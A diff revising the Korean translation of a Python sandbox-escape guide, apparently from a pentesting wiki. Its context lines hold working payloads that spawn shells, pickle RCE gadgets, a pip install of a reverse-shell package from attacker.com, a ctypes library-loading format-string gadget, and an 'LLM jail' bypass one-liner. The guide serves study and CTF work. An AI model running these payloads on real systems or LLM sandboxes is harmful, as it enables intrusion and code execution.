@@ -60,7 +60,7 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-기억하세요, _**open**_ 및 _**read**_ 함수는 python 샌드박스 내에서 **파일을 읽는** 데 유용하며, **샌드박스를 우회하기 위해 실행할 수 있는 코드를 작성하는** 데 유용합니다.
+기억하세요, _**open**_ 및 _**read**_ 함수는 python sandbox 내에서 **파일을 읽고** **실행할 수 있는 코드**를 **작성하는 데** 유용할 수 있습니다.
 
 {% hint style="danger" %}
 **Python2 input()** 함수는 프로그램이 충돌하기 전에 python 코드를 실행할 수 있게 해줍니다.
@@ -70,7 +70,7 @@ Python은 **현재 디렉토리에서 라이브러리를 먼저 로드하려고 
 
 ![](<../../../.gitbook/assets/image (559).png>)
 
-## 기본 설치된 python 패키지로 pickle 샌드박스 우회하기
+## 기본 설치된 python 패키지로 pickle sandbox 우회하기
 
 ### 기본 패키지
 
@@ -89,7 +89,7 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-더 많은 정보는 pickle 작동 방식에 대해 다음을 확인하세요: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+더 많은 정보는 pickle 작동 방식에 대한 내용을 확인하세요: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
 ### Pip 패키지
 
@@ -108,7 +108,7 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 이 패키지는 `Reverse`라고 불립니다. 그러나 리버스 셸을 종료할 때 나머지 설치가 실패하도록 특별히 제작되었으므로, 떠날 때 **서버에 추가적인 파이썬 패키지가 설치되지 않게 됩니다**.
 {% endhint %}
 
-## 파이썬 코드 평가
+## 파이썬 코드 실행
 
 {% hint style="warning" %}
 exec는 여러 줄 문자열과 ";"를 허용하지만, eval은 허용하지 않습니다(월러스 연산자 확인).
@@ -158,9 +158,9 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Bypassing protections through encodings (UTF-7)
+## 인코딩을 통한 보호 우회 (UTF-7)
 
-In [**이 글**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7은 겉보기에는 샌드박스 안에서 임의의 파이썬 코드를 로드하고 실행하는 데 사용됩니다:
+[**이 글**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)에서는 UFT-7을 사용하여 겉보기에는 샌드박스 안에서 임의의 파이썬 코드를 로드하고 실행합니다:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -199,13 +199,13 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-### RCE 객체 생성 및 오버로딩
+### RCE 객체 생성 및 오버로드
 
-당신이 **클래스를 선언**하고 **그 클래스의 객체를 생성**할 수 있다면, **직접 호출할 필요 없이** **트리거될 수 있는** **다양한 메서드**를 **작성/오버라이드**할 수 있습니다.
+클래스를 **선언**하고 해당 클래스의 **객체를 생성**할 수 있다면, **직접 호출할 필요 없이** **트리거**될 수 있는 **다양한 메서드**를 **작성/오버라이드**할 수 있습니다.
 
 #### 사용자 정의 클래스를 통한 RCE
 
-일부 **클래스 메서드**를 (_기존 클래스 메서드를 오버라이드하거나 새로운 클래스를 생성함으로써_) 수정하여 **직접 호출하지 않고도** **트리거될 때 임의의 코드를 실행**하도록 만들 수 있습니다.
+일부 **클래스 메서드**를 (기존 클래스 메서드를 오버라이드하거나 새로운 클래스를 생성하여) 수정하여 **직접 호출하지 않고** **트리거**될 때 **임의의 코드를 실행**하도록 만들 수 있습니다.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -274,7 +274,7 @@ Sub['import os; os.system("sh")']
 ```
 #### 예외로 객체 생성하기
 
-**예외가 발생할 때** **Exception**의 객체가 **생성**되며, 직접 생성자를 호출할 필요가 없습니다 ( [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez) 의 트릭):
+**예외가 발생할 때** **Exception**의 객체가 **직접 생성자를 호출할 필요 없이** **생성됩니다** ( [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez) 의 트릭):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -340,7 +340,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 `__builtins__`가 없으면 아무것도 가져올 수 없고 파일을 읽거나 쓸 수도 없습니다. **모든 전역 함수**(예: `open`, `import`, `print`...) **가 로드되지 않기 때문입니다.**\
 그러나 **기본적으로 파이썬은 많은 모듈을 메모리에 가져옵니다.** 이 모듈들은 무해해 보일 수 있지만, 그 중 일부는 **위험한** 기능을 내부에 가져오고 있어 이를 통해 **임의 코드 실행**을 얻을 수 있습니다.
 
-다음 예제에서는 **이용**할 수 있는 **"무해한"** 모듈을 어떻게 **악용**하여 **위험한** **기능**에 **접근**할 수 있는지 관찰할 수 있습니다.
+다음 예제에서는 **이 "무해한"** 모듈을 **악용**하여 **내부의** **위험한** **기능**에 **접근하는** 방법을 관찰할 수 있습니다.
 
 **Python2**
 ```python
@@ -424,7 +424,7 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**아래에는 더 큰 함수가 있습니다**](./#recursive-search-of-builtins-globals) 수십/**수백** 개의 **위치**에서 **globals**를 찾을 수 있습니다.
+[**아래에는 더 큰 함수가 있습니다**](./#recursive-search-of-builtins-globals) 수십/**수백** 개의 **위치**를 찾아 **globals**를 찾을 수 있습니다.
 
 ## 임의 실행 발견
 
@@ -432,7 +432,7 @@ class_obj.__init__.__globals__
 
 #### 우회로 서브클래스에 접근하기
 
-이 기술의 가장 민감한 부분 중 하나는 **기본 서브클래스에 접근할 수 있는** 것입니다. 이전 예제에서는 `''.__class__.__base__.__subclasses__()`를 사용하여 이를 수행했지만 **다른 가능한 방법**도 있습니다:
+이 기술의 가장 민감한 부분 중 하나는 **기본 서브클래스에 접근할 수 있는 것**입니다. 이전 예제에서는 `''.__class__.__base__.__subclasses__()`를 사용하여 수행되었지만 **다른 가능한 방법**이 있습니다:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -462,7 +462,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### 위험한 라이브러리 찾기
 
-예를 들어, **`sys`** 라이브러리를 사용하면 **임의의 라이브러리를 가져올 수** 있다는 것을 알고 있다면, **그 안에 sys를 가져온 모든 모듈을 검색할 수** 있습니다:
+예를 들어, **`sys`** 라이브러리를 사용하면 **임의의 라이브러리를 가져올 수** 있다는 것을 알고 있다면, **그 안에 sys를 가져온 모든 모듈을 검색할 수 있습니다**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -561,7 +561,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## 내장 함수, 전역 변수의 재귀적 검색...
 
 {% hint style="warning" %}
-이것은 정말 **멋집니다**. 만약 **globals, builtins, open 또는 그와 유사한 객체를 찾고 있다면** 이 스크립트를 사용하여 **그 객체를 찾을 수 있는 위치를 재귀적으로 찾아보세요.**
+이것은 정말 **멋집니다**. 만약 당신이 **globals, builtins, open 또는 그와 유사한 객체를 찾고 있다면** 이 스크립트를 사용하여 **그 객체를 찾을 수 있는 장소를 재귀적으로 찾으세요.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -706,16 +706,16 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-노트: 일반적인 방법으로 **속성**에 **점**을 사용하여 접근할 수 있습니다 `people_obj.__init__`와 **딕셔너리 요소**에 **괄호**를 사용하여 인용 없이 접근할 수 있습니다 `__globals__[CONFIG]`
+노트: 일반적인 방법으로 **속성**에 **점**을 사용하여 접근할 수 있습니다 `people_obj.__init__`와 **딕셔너리 요소**에 **괄호**를 사용하여 인용 없이 `__globals__[CONFIG]`
 
 또한 `.__dict__`를 사용하여 객체의 요소를 열거할 수 있습니다 `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-형식 문자열의 다른 흥미로운 특성 중 하나는 **`str`**, **`repr`** 및 **`ascii`** 함수를 지정된 객체에서 각각 **`!s`**, **`!r`**, **`!a`**를 추가하여 **실행**할 수 있는 가능성입니다:
+형식 문자열의 다른 흥미로운 특성은 **`str`**, **`repr`** 및 **`ascii`** 함수를 지정된 객체에서 각각 **`!s`**, **`!r`**, **`!a`**를 추가하여 **실행**할 수 있는 가능성입니다:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-또한, 클래스에서 **새로운 포매터를 코드화**하는 것이 가능합니다:
+또한, 클래스에서 **새로운 포맷터를 코드화**하는 것이 가능합니다:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -752,22 +752,22 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### LLM Jails bypass
+### LLM Jails 우회
 
 From [here](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
-### From format to RCE loading libraries
+### 포맷에서 RCE 라이브러리 로딩으로
 
-According to the [**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/) it's possible to load arbitrary libraries from disk abusing the format string vulnerability in python.
+[**이 글의 TypeMonkey 챌린지**](https://corgi.rip/posts/buckeye-writeups/)에 따르면, 파이썬의 포맷 문자열 취약점을 악용하여 디스크에서 임의의 라이브러리를 로드할 수 있습니다.
 
-As reminder, every time an action is performed in python some function is executed. For example `2*3` will execute **`(2).mul(3)`** or **`{'a':'b'}['a']`** will be **`{'a':'b'}.__getitem__('a')`**.
+상기 사항으로, 파이썬에서 어떤 작업이 수행될 때마다 어떤 함수가 실행됩니다. 예를 들어 `2*3`은 **`(2).mul(3)`**을 실행하거나 **`{'a':'b'}['a']`**는 **`{'a':'b'}.__getitem__('a')`**이 됩니다.
 
-You have more like this in the section [**Python execution without calls**](./#python-execution-without-calls).
+이와 유사한 내용은 [**호출 없이 파이썬 실행**](./#python-execution-without-calls) 섹션에서 더 확인할 수 있습니다.
 
-A python format string vuln doesn't allow to execute function (it's doesn't allow to use parenthesis), so it's not possible to get RCE like `'{0.system("/bin/sh")}'.format(os)`.\
-However, it's possible to use `[]`. Therefore, if a common python library has a **`__getitem__`** or **`__getattr__`** method that executes arbitrary code, it's possible to abuse them to get RCE.
+파이썬 포맷 문자열 취약점은 함수를 실행할 수 없으므로 (괄호를 사용할 수 없기 때문에), `'{0.system("/bin/sh")}'.format(os)`와 같은 RCE를 얻는 것은 불가능합니다.\
+그러나 `[]`를 사용할 수 있습니다. 따라서, 일반적인 파이썬 라이브러리에 임의의 코드를 실행하는 **`__getitem__`** 또는 **`__getattr__`** 메서드가 있다면, 이를 악용하여 RCE를 얻을 수 있습니다.
 
-Looking for a gadget like that in python, the writeup purposes this [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Where he found this [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
+파이썬에서 그런 가젯을 찾기 위해, 글에서는 이 [**Github 검색 쿼리**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code)를 제안합니다. 여기서 그는 이 [하나](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463)를 발견했습니다:
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -789,7 +789,7 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-이 장치는 **디스크에서 라이브러리를 로드**할 수 있게 해줍니다. 따라서, 공격받는 서버에 **정확하게 컴파일된 라이브러리를 작성하거나 업로드**하는 방법이 필요합니다.
+이 장치는 **디스크에서 라이브러리를 로드**할 수 있게 해줍니다. 따라서 공격받는 서버에 **정확하게 컴파일된 라이브러리를 작성하거나 업로드**하는 방법이 필요합니다.
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
@@ -924,7 +924,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-**파이썬 샌드박스에서 `dis`를 가져올 수 없는 경우**, 함수의 **바이트코드**(`get_flag.func_code.co_code`)를 얻고 **로컬에서 분해**할 수 있습니다. 로드되는 변수의 내용(`LOAD_CONST`)은 볼 수 없지만, `LOAD_CONST`가 로드되는 변수의 오프셋도 알려주기 때문에 (`get_flag.func_code.co_consts`)를 통해 추측할 수 있습니다.
+**파이썬 샌드박스에서 `dis`를 가져올 수 없는 경우** 함수의 **바이트코드** (`get_flag.func_code.co_code`)를 얻고 **로컬에서 분해**할 수 있습니다. 로드되는 변수의 내용(`LOAD_CONST`)은 볼 수 없지만, `LOAD_CONST`가 로드되는 변수의 오프셋도 알려주기 때문에 (`get_flag.func_code.co_consts`)로 추측할 수 있습니다.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -946,10 +946,10 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
-## Python 컴파일
+## Compiling Python
 
 이제, 어떻게든 **실행할 수 없는 함수에 대한 정보를 덤프할 수 있다고 상상해 보십시오**. 하지만 **실행해야** 합니다.\
-다음 예제와 같이, 해당 함수의 **코드 객체에 접근할 수 있지만**, disassemble을 읽는 것만으로는 **플래그를 계산하는 방법을 알 수 없습니다** (_더 복잡한 `calc_flag` 함수라고 상상해 보십시오_)
+다음 예제와 같이, 그 함수의 **코드 객체에 접근할 수 있지만**, disassemble을 읽는 것만으로는 **플래그를 계산하는 방법을 알 수 없습니다** (_더 복잡한 `calc_flag` 함수라고 상상해 보십시오_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -984,7 +984,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-사용 중인 파이썬 버전에 따라 `code_type`의 **매개변수**는 **다른 순서**를 가질 수 있습니다. 사용 중인 파이썬 버전에서 매개변수의 순서를 확인하는 가장 좋은 방법은 다음을 실행하는 것입니다:
+사용 중인 파이썬 버전에 따라 `code_type`의 **매개변수**는 **다른 순서**를 가질 수 있습니다. 사용 중인 파이썬 버전에서 매개변수의 순서를 아는 가장 좋은 방법은 다음을 실행하는 것입니다:
 ```
 import types
 types.CodeType.__doc__
@@ -1009,7 +1009,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-이 포스트의 시작 부분에 있는 이전 예제에서, **`compile` 함수**를 사용하여 **어떤 파이썬 코드든 실행하는 방법**을 볼 수 있습니다. 이는 **전체 스크립트**를 루프와 함께 **한 줄**로 실행할 수 있기 때문에 흥미롭습니다 (그리고 **`exec`**를 사용하여 동일한 작업을 수행할 수 있습니다).\
+이 게시물의 시작 부분에 있는 이전 예제에서 **`compile` 함수**를 사용하여 **어떤 파이썬 코드든 실행하는 방법**을 볼 수 있습니다. 이는 **전체 스크립트**를 루프와 함께 **한 줄**로 실행할 수 있기 때문에 흥미롭습니다 (그리고 **`exec`**를 사용하여 동일한 작업을 수행할 수 있습니다).\
 어쨌든, 때때로 **로컬 머신**에서 **컴파일된 객체**를 **생성**하고 **CTF 머신**에서 실행하는 것이 유용할 수 있습니다 (예를 들어 CTF에서 `compiled` 함수가 없기 때문에).
 
 예를 들어, _./poc.py_를 읽는 함수를 수동으로 컴파일하고 실행해 보겠습니다:
@@ -1039,7 +1039,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-`eval` 또는 `exec`에 접근할 수 없는 경우 **적절한 함수를** 생성할 수 있지만, 이를 직접 호출하면 일반적으로 다음과 같은 오류가 발생합니다: _제한된 모드에서 생성자에 접근할 수 없습니다_. 따라서 이 함수를 호출하기 위해 **제한된 환경에 있지 않은 함수가 필요합니다.**
+`eval` 또는 `exec`에 접근할 수 없는 경우 **적절한 함수를** 생성할 수 있지만, 이를 직접 호출하면 일반적으로 다음과 같은 오류가 발생합니다: _제한된 모드에서 생성자에 접근할 수 없음_. 따라서 이 함수를 호출하기 위해 **제한된 환경에 있지 않은 함수가 필요합니다.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
